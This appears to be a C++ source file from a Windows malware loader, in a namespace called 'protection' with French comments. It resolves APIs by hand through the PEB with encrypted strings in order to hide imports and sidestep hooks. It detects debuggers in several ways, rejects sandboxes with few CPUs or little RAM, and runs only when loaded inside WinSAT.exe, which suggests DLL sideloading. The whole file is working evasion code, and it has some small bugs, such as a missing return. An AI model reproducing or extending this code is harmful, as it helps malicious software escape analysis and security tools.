namespace protection {

    // Recup l'adresse du PEB (64 bits == 0x60)
    __forceinline _PEB* GetPEB() {
        return reinterpret_cast<_PEB*>(__readgsqword(0x60));
    }

    int strcmpA(const char* a, const char* b) {
        while (*a && *a == *b) { ++a; ++b; }
        return (int)(unsigned char)(*a) - (int)(unsigned char)(*b);
    }

    BYTE* GetProcAddressA(HINSTANCE hDll, const char* szFunc) {

        if (!hDll) return nullptr;

        BYTE* pBase = reinterpret_cast<BYTE*>(hDll);
        auto* pNT = reinterpret_cast<IMAGE_NT_HEADERS*>(pBase + reinterpret_cast<IMAGE_DOS_HEADER*>(pBase)->e_lfanew);
        auto* pExportDir = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(pBase + pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        if (reinterpret_cast<UINT_PTR>(szFunc) <= MAXWORD) {
            WORD Ordinal = (WORD)szFunc;
            DWORD RVA = reinterpret_cast<DWORD*>(pBase + pExportDir->AddressOfFunctions)[Ordinal];
            return pBase + RVA;
        }

        DWORD max = pExportDir->NumberOfNames - 1;
        DWORD min = 0;

        while (min <= max) {
            DWORD mid = (min + max) >> 1;

            DWORD CurrNameRVA = reinterpret_cast<DWORD*>(pBase + pExportDir->AddressOfNames)[mid];
            char* szName = reinterpret_cast<char*>(pBase + CurrNameRVA);

            int cmp = strcmpA(szName, szFunc);
            if (cmp < 0) min = mid + 1;
            else if (cmp > 0) max = mid - 1;
            else {
                WORD Ordinal = reinterpret_cast<WORD*>(pBase + pExportDir->AddressOfNameOrdinals)[mid];
                DWORD RVA = reinterpret_cast<DWORD*>(pBase + pExportDir->AddressOfFunctions)[Ordinal];
                return pBase + RVA;
            }
        }

    }

    bool ResolveImports() {

        // Recup la base address de kernel32.dll pour ensuite récupérer l'addresse
        // de la fonction LoadLibraryA qui va ensuite nous servir à récupérer l'adresse
        // des autres imports. Ca evite donc les IAT hooks et cache les imports

        HMODULE kernel32 = (HMODULE)GetKernel32BaseAddress();
        if (!kernel32) return false;

        void* functionAddress = nullptr;

        auto txtLoadLibraryA = binks("LoadLibraryA");
        functionAddress = GetProcAddressA(kernel32, txtLoadLibraryA);
        txtLoadLibraryA.clear();
        if (!functionAddress) return false;
        _LoadLibraryA = (_LOADLIBRARYA)functionAddress;

        auto txtNtdll = binks("ntdll.dll");
        HMODULE ntdll = _LoadLibraryA(txtNtdll);
        txtNtdll.clear();
        if (!ntdll) return false;

        auto txtGetCurrentProcessId = binks("GetCurrentProcessId");
        functionAddress = GetProcAddressA(kernel32, txtGetCurrentProcessId);
        txtGetCurrentProcessId.clear();
        if (!functionAddress) return false;
        _GetCurrentProcessId = (_GETCURRENTPROCESSID)functionAddress;

        auto txtGetSystemInfo = binks("GetSystemInfo");
        functionAddress = GetProcAddressA(kernel32, txtGetSystemInfo);
        txtGetSystemInfo.clear();
        if (!functionAddress) return false;
        _GetSystemInfo = (_GETSYSTEMINFO)functionAddress;

        auto txtGlobalMemoryStatusEx = binks("GlobalMemoryStatusEx");
        functionAddress = GetProcAddressA(kernel32, txtGlobalMemoryStatusEx);
        txtGlobalMemoryStatusEx.clear();
        if (!functionAddress) return false;
        _GlobalMemoryStatusEx = (_GLOBALMEMORYSTATUSEX)functionAddress;

        auto txtCreateToolhelp32Snapshot = binks("CreateToolhelp32Snapshot");
        functionAddress = GetProcAddressA(kernel32, txtCreateToolhelp32Snapshot);
        txtCreateToolhelp32Snapshot.clear();
        if (!functionAddress) return false;
        _CreateToolhelp32Snapshot = (_CREATETOOLHELP32SNAPSHOT)functionAddress;

        auto txtProcess32FirstW = binks("Process32FirstW");
        functionAddress = GetProcAddressA(kernel32, txtProcess32FirstW);
        txtProcess32FirstW.clear();
        if (!functionAddress) return false;
        _Process32FirstW = (_PROCESS32FIRSTW)functionAddress;

        auto txtProcess32NextW = binks("Process32NextW");
        functionAddress = GetProcAddressA(kernel32, txtProcess32NextW);
        txtProcess32NextW.clear();
        if (!functionAddress) return false;
        _Process32NextW = (_PROCESS32NEXTW)functionAddress;

        auto txtCloseHandle = binks("CloseHandle");
        functionAddress = GetProcAddressA(kernel32, txtCloseHandle);
        txtCloseHandle.clear();
        if (!functionAddress) return false;
        _CloseHandle = (_CLOSEHANDLE)functionAddress;

        auto txtGetComputerNameW = binks("GetComputerNameW");
        functionAddress = GetProcAddressA(kernel32, txtGetComputerNameW);
        txtGetComputerNameW.clear();
        if (!functionAddress) return false;
        _GetComputerNameW = (_GETCOMPUTERNAMEW)functionAddress;

        auto txtIsDebuggerPresent = binks("IsDebuggerPresent");
        functionAddress = GetProcAddressA(kernel32, txtIsDebuggerPresent);
        txtIsDebuggerPresent.clear();
        if (!functionAddress) return false;
        _IsDebuggerPresent = (_ISDEBUGGERPRESENT)functionAddress;

        auto txtNtQueryInformationProcess = binks("NtQueryInformationProcess");
        functionAddress = GetProcAddressA(ntdll, txtNtQueryInformationProcess);
        txtNtQueryInformationProcess.clear();
        if (!functionAddress) return false;
        _NtQueryInformationProcess = (_NTQUERYINFORMATIONPROCESS)functionAddress;

        auto txtSetLastError = binks("SetLastError");
        functionAddress = GetProcAddressA(kernel32, txtSetLastError);
        txtSetLastError.clear();
        if (!functionAddress) return false;
        _SetLastError = (_SETLASTERROR)functionAddress;

        auto txtGetLastError = binks("GetLastError");
        functionAddress = GetProcAddressA(kernel32, txtGetLastError);
        txtGetLastError.clear();
        if (!functionAddress) return false;
        _GetLastError = (_GETLASTERROR)functionAddress;

        auto txtOutputDebugStringA = binks("OutputDebugStringA");
        functionAddress = GetProcAddressA(kernel32, txtOutputDebugStringA);
        txtOutputDebugStringA.clear();
        if (!functionAddress) return false;
        _OutputDebugStringA = (_OUTPUTDEBUGSTRINGA)functionAddress;

        return true;

    }

    bool DetectDebugger() {

        if (_IsDebuggerPresent()) return true;

        _SetLastError(1111);
        _OutputDebugStringA(" ");
        if (_GetLastError() != 1111) return true;

        static auto peb = GetPEB();
        auto beingDebugged = static_cast<bool>(peb->BeingDebugged);
        if (beingDebugged) return true;

        DWORD ntGlobalFlag = *(PDWORD)((PBYTE)peb + 0xBC);
        if (ntGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED) return true;

        uint32_t debugInherit = 0;
        auto status = _NtQueryInformationProcess(INVALID_HANDLE_VALUE, (PROCESSINFOCLASS)31, &debugInherit, sizeof(debugInherit), 0);
        if (!NT_SUCCESS(status) || debugInherit == 0) return true;

        uint64_t remoteDebug = 0;
        status = _NtQueryInformationProcess(INVALID_HANDLE_VALUE, (PROCESSINFOCLASS)7, &remoteDebug, sizeof(remoteDebug), 0);
        if (!NT_SUCCESS(status) || remoteDebug != 0) return true;

        return false;
    }

    DWORD FindPidByName(std::wstring processName) {

        PROCESSENTRY32W pe32;
        HANDLE snapshot = nullptr;
        DWORD pid = 0;

        snapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE && snapshot) {
            pe32.dwSize = sizeof(PROCESSENTRY32W);
            if (_Process32FirstW(snapshot, &pe32)) {
                do {
                    if (!_wcsicmp(pe32.szExeFile, processName.c_str())) {
                        pid = pe32.th32ProcessID;
                        break;
                    }
                } while (_Process32NextW(snapshot, &pe32));
            }
            _CloseHandle(snapshot);
        }

        return pid;

    }

    bool IsExecutionAuthorized() {

        auto txtWinsat = binks(L"WinSAT.exe");
        if (_GetCurrentProcessId() != FindPidByName(txtWinsat.decrypt())) {
            txtWinsat.clear();
            return false;
        }
        txtWinsat.clear();

        SYSTEM_INFO systemInfo{};
        _GetSystemInfo(&systemInfo);
        if (systemInfo.dwNumberOfProcessors <= 2) return false;

        MEMORYSTATUSEX memoryStatus{};
        memoryStatus.dwLength = sizeof(memoryStatus);
        _GlobalMemoryStatusEx(&memoryStatus);
        DWORD ramMb = memoryStatus.ullTotalPhys / 1024 / 1024;
        if (ramMb <= 2048) return false;

        return true;

    }

    bool Init() {
        peb = GetPEB();
        if (!peb) return false;
        if (!ResolveImports()) return false;
        return IsExecutionAuthorized();
    }

}